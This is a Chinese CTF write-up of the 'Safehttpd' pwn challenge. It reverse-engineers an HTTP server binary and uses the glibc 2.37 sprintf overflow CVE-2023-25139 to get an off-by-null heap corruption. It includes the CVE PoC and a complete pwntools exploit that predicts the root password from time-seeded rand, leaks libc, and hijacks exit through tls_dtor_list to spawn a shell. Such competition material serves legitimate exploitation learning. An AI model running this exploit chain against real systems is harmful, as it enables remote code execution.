---
title: Off_by_null-Safehttpd
date: 2023-11-27 15:34:21
categories:
- Off by null
tags:
- CVE-2023-25139
- Tls_dtor_list attack
toc: true
---


## 1.程序保护

保护全开。

```shell
john@john-virtual-machine:~/Desktop$ checksec httpd
[*] '/home/john/Desktop/httpd'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/home/john/glibc-patcher/libs/amd64/2.37-0ubuntu1_amd64'
```

## 2.程序逆向

### 2.1 https

基本逻辑：通过get_req 函数获取请求头数据，接着分割请求头数据，得到包括请求方法，请求路径以及请求参数，传入到handle_req。

![OrSzYj.png](https://ooo.0x0.ooo/2023/11/28/OrSzYj.png)

而在handle_req 函数中，根据对应的请求方法和请求路径，到具体的功能函数。

>注意：
- 每次请求会获取`fd`，并且会在`handle_req`函数返回时，将`close(fd)`。
- `GET`请求会额外获取参数`Content-Length`。

![OrSiKU.png](https://ooo.0x0.ooo/2023/11/28/OrSiKU.png)

### 2.2 get_init
`get_init` 函数，会随机给`root`用户生成一个13字节大小的`password`，且`root.uid = 0`，把`root`的相关信息填充到一个`0x3c`的结构体中，结构体结构如下：

```c
00000000 info struc ; (sizeof=0x3C, mappedto_8)
00000000 fd dq ?                                 ; offset
00000008 bk dq ?                                 ; offset
00000010 stings db 32 dup(?)
00000030 data_addr dq ?
00000038 data_len dd ?
0000003C info ends
0000003C
```

![OrS1wv.png](https://ooo.0x0.ooo/2023/11/28/OrS1wv.png)

### 2.3 get_register

`get_register` 函数跟 `get_init` 函数逻辑类似，只是`username`，`password` ，`uid`，`len`需要我们自己输入。

>注意：
- 拷贝`username`，`password` 用的是`strdup`，本质也是`malloc`。
- 输入的用户名，密码，`uid`以及数据块的大小都有限制。例如：（`uid!=0 && uid<=0x3e8` )

![OrSN1q.png](https://ooo.0x0.ooo/2023/11/28/OrSN1q.png)

### 2.4 get_logoff

`get_logoff`函数通过遍历用户名和密码，将对应的用户信息从双向链表中解链出。

### 2.5 get_show

`get_show` 主要用来返回`info->data_addr`，并通过传入`bad_request`函数作为第二个参数，返回给用户。

![OrSeDc.png](https://ooo.0x0.ooo/2023/11/28/OrSeDc.png)

![OrSr8r.png](https://ooo.0x0.ooo/2023/11/28/OrSr8r.png)

### 2.6 post_note

`post_note` 函数主要是对`info->data_addr`进行修改，并且要求`Content_length`小于`info->data_len`，且该用户`uid = 0`。

![OrSZpG.png](https://ooo.0x0.ooo/2023/11/28/OrSZpG.png)


## 3.漏洞分析

### 3.1 栈溢出

`bad_request` 函数返回给用户数据过程中，如果返回的地址来自于自己注册的用户，堆的最大大小为0x400，但如果返回的地址来自`init`函数，堆的大小为0x4f8，可以会导致栈溢出，所以存在栈溢出漏洞。

>难以利用：不能泄露`canary`，即使`canary`泄露出来，但是`canary`本身最低一个字节是`\x00`，也会导致截断。
>要是覆盖`canary`，构造的paylaod也会有截断，除非一次性覆盖到返回地址。

![OrS48l.png](https://ooo.0x0.ooo/2023/11/28/OrS48l.png)

### 3.2 CVE-2023-25139

 **漏洞信息**：
 GNU C 库 (glibc) 2.37 中的 sprintf 在某些缓冲区大小正确的情况下会出现缓冲区溢出（越界写入）。如果为缓冲区分配了将数字表示为字符串所需的确切大小，则在尝试写入数字的填充的千位分隔字符串表示形式时，可能会超出目标缓冲区的范围。例如，1,234,567（填充为 13）会溢出两个字节。

poc： [https://sourceware.org/bugzilla/show_bug.cgi?id=30068](https://sourceware.org/bugzilla/show_bug.cgi?id=30068)

```c
#include <stdio.h>
#include <locale.h>
#include <string.h>

int main(void)
{
    char buf[strlen("12345678:") + 1];
    __builtin_memset(buf, 'x', sizeof(buf));
    if (setlocale(LC_ALL, ""))
    {
        for (size_t i = 0; i < strlen("12345678:") + 1; i++)
        {
            printf("%c", buf[i]);
        }
        printf("\n");
        printf("12345678:\n");
        printf("%-'8d:\n", 1000);
        sprintf(buf, "%-'8d:", 1000);
        for (size_t i = 0; i < strlen("12345678:") + 1; i++)
        {
            printf("%c", buf[i]);
        }
        printf("\n");
    }
    return 0;
}
```

在`Linux`编译以上poc，patch上2.37的libc，结果如下：

```shell
john@john-virtual-machine:~/Desktop$ ./test
xxxxxxxxxx
12345678:
1,000    :
1,000    :
```

在后续测试过程中发现，先`setlocale`，然后再`register`一个新的用户，且该用户`uid=1000`，会导致`info->data_addr`的最低字节会被清空，造成`off by null`

## 4.EXP及调试

>在后利用阶段，主要用的是`tls_dtor_list`劫持`exit`执行流的方法，该方法只需要泄露libc的基地址即可，在这一题中，我用标志错误输出来泄露libc的基地址，和其他师傅赛后交流后，如果用ROP反弹flag的话，还需要泄露栈地址，这样会关闭标准输出。

`tls_dtor_list`劫持`exit`执行流的利用条件：
- 存在任意地址写的漏洞利用
- 能够篡改或泄露`fs_base + 0x30`的值
- 程序会通过`exit`函数结束程序，若是通过`_exit`则不行

参考：
[https://tttang.com/archive/1749/](https://tttang.com/archive/1749/)

[https://www.cnblogs.com/hetianlab/p/17682896.html](https://www.cnblogs.com/hetianlab/p/17682896.html)

```python
from pwn import *
from ctypes import *
#from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')
#context.terminal = ['tmux','splitw','-h']
filename = './httpd'
debug = 0
ip = '122.9.149.82'
port = 9999
libc_dll = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF('./libc.so.6')

if debug:
    p = process(filename)
else:
    p = remote(ip,port)

ru      = lambda a:     p.recvuntil(a)
r       = lambda n:     p.recv(n)
sla     = lambda a,b:   p.sendlineafter(a,b)
sa      = lambda a,b:   p.sendafter(a,b)
sl      = lambda a:     p.sendline(a)
s       = lambda a:     p.send(a)

def inter() : p.interactive()
def debu(cmd=''):
    gdb.attach(p,cmd)
    pause()
def get_addr(): 
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
def get_sysbin(libc_base,libc): 
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
def csu(rdi, rsi, rdx, rip, gadget) : 
    return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)

def init(fd):
    payload = b'GET /init\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n\n'
    s(payload)
    
def poweroff(fd):
    payload = b'GET /poweroff\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n\n'
    s(payload)

def register(username,password,uid,length,fd):
    payload = b'GET /register?username='+username+b'&password='+password+b'&uid='+str(uid).encode()+b'&len='+str(length).encode()+b'\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n\n'
    s(payload)

def logoff(username,password,fd):
    payload = b'GET /logoff?username='+username+b'&password='+password+b'\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n\n'
    s(payload)

def setlocale(fd):
    payload = b'GET /setlocale?LC_ALL=en_US.UTF-8\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n\n'
    s(payload)

def post_note(username,password,length,fd):
    payload = b'POST /note?username='+username+b'&password='+password+b'\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n'
    payload += b'Content-Length: '+str(length).encode()+b'\n\n'
    s(payload)
    
def show(username,password,fd):
    payload = b'GET /show?username='+username+b'&password='+password+b'\n'
    payload += b'Stdout: '+str(fd).encode()+b'\n\n'
    s(payload)

def get_passwd():
    now_time = libc_dll.time(None)
    print(now_time)
    libc_dll.srand(now_time)
    rand_list = []
    for _ in range(13):
        while True:
            num = c_byte(libc_dll.rand())
            if num.value > 32 and num.value != 127:
                rand_list.append(hex(num.value)[2:].zfill(2))
                break
    root_password = bytes(bytearray.fromhex("".join(rand_list)))
    return root_password

setlocale(10)
register(b'test1',b'test',1,1024,10)
register(b'a'*0x98+b'\x01\x05',b'b'*0x10,1,1024,10)
register(b'test2',b'test',1,48,10)
register(b'test3',b'test',1000,944,10)
root1 = get_passwd()
init(10)

logoff(b'test3',b'test',10)
sleep(2)
root2 = get_passwd()
init(10)
logoff(b'root',root1,10)
show(b'root',root2,2)

#debu('b *$rebase(0x2d4e)')

libc_base = get_addr()-0x1f6ce0
print("libc_base : ",hex(libc_base))
func_list = libc_base-0x2910
print("func list : ",hex(func_list))
key = libc_base-0x2890
print("key : ",hex(key))
bin_sh = libc_base+0x1B51D2
print("bin sh : ",hex(bin_sh))
system_addr = libc_base+0x4ebd0
print("system : ",hex(system_addr))


post_note(b'root',root2,0x48,10)
s(b'a'*0x20+b'test2   :test         :0       \x00'+p64(key))
post_note(b'test2',b'test',0x18,10)
s(p64(0x0)+p64(rol(system_addr,0x11))+p64(bin_sh))

post_note(b'root',root2,0x48,10)
s(b'a'*0x20+b'test2   :test         :0       \x00'+p64(func_list))
post_note(b'test2',b'test',0x8,10)
s(p64(key+0x8))

poweroff(10)
#debu()
inter()
```


- **将fake_chunk的size写在0xb0的tcache_bin上，大小为0x500，且使得fake_chunk的地址最低字节为`\x00`**
```python
setlocale(10)
register(b'test1',b'test',1,1024,10)
register(b'a'*0x98+b'\x01\x05',b'b'*0x10,1,1024,10)
```

![OrSHxg.png](https://ooo.0x0.ooo/2023/11/28/OrSHxg.png)

- **将test2的用户信息保存在fake_chunk的数据区域，注册一个test3用户用于触发off by null，使得test3->data_addr 为fake_chunk 0x55f709cb9900，再init root1，是为保证free fake_chunk 时，pre_size检查通过。**

```python
register(b'test2',b'test',1,48,10)
register(b'test3',b'test',1000,944,10)
root1 = get_passwd()
init(10)
```

![OrSLJB.png](https://ooo.0x0.ooo/2023/11/28/OrSLJB.png)

- **将fake_chunk free后，再用一个init root2将0x500的fake_chunk申请回来 ，此时root2可以修改test2 的用户信息。**

```python
logoff(b'test3',b'test',10)
sleep(2)
root2 = get_passwd()
init(10)
```

![OrSEfs.png](https://ooo.0x0.ooo/2023/11/28/OrSEfs.png)

- **将root1 从链表中删除后，用标准错误输出来泄露libc的基地址，随后可以得到`fs_base+0x30`等地址，将加密后的函数指针和参数放到`fs_base+0x38`位置，`fs_base+0x30`位置清空，`tls_dtor_list`位置写`fs_base+0x38`。**

```python
logoff(b'root',root1,10)
show(b'root',root2,2)

#debu('b *$rebase(0x2d4e)')

libc_base = get_addr()-0x1f6ce0
print("libc_base : ",hex(libc_base))
func_list = libc_base-0x2910
print("func list : ",hex(func_list))
key = libc_base-0x2890
print("key : ",hex(key))
bin_sh = libc_base+0x1B51D2
print("bin sh : ",hex(bin_sh))
system_addr = libc_base+0x4ebd0
print("system : ",hex(system_addr))


post_note(b'root',root2,0x48,10)
s(b'a'*0x20+b'test2   :test         :0       \x00'+p64(key))
post_note(b'test2',b'test',0x18,10)
s(p64(0x0)+p64(rol(system_addr,0x11))+p64(bin_sh))

post_note(b'root',root2,0x48,10)
s(b'a'*0x20+b'test2   :test         :0       \x00'+p64(func_list))
post_note(b'test2',b'test',0x8,10)
s(p64(key+0x8))

poweroff(10)
```

![OrSQBK.png](https://ooo.0x0.ooo/2023/11/28/OrSQBK.png)

- **感谢比赛平台，今天打远程，发现靶机还是开着的，并且成功验证了该利用方式的可行性，并且看见靶机目录上有文件`1`,`2`,`3`，盲猜是师傅们将flag 文件内容重定向到其他标准流.**

![OrSSZa.png](https://ooo.0x0.ooo/2023/11/28/OrSSZa.png)

## 5.总结

1.  两天时间大部分都在做这道题，一直找不到合适漏洞来利用，到了第二天上午，和同队师傅交流后，找到CVE-2023-25139，但是一直无法成功触发off by one，但其他师傅都可以，原来我用WSL来调试的，索性直接把WSL关了，用Ubuntu虚拟机就直接可以，哭死。
2. 成功触发后就在构造堆布局，原来的堆布局只能一次任意地址写，然后就从`tls_dtor_list`一直写到`fs_base+0x30`位置，会覆盖canary，导致函数退出时，验证canary报错。
3. 由于不想再调整堆布局，就想用`house of apple2`来打，但是要泄露libc基地址和heap导致，导致关闭标准输出流，最后触发`system(" sh;")`，也无法正常交互。
4. 此时只能重新构造堆布局，两次任意地址写用ROP打反弹flag，同样也需要两次泄露地址，个人觉得不如`tls_dtor_list`劫持程序流。
5. 最后本地可以通，但是远程一直报错，其他师傅提示要`setlocale(LC_ALL,en_US.UTF-8)`，稍微调一下堆大小，即可远程也通。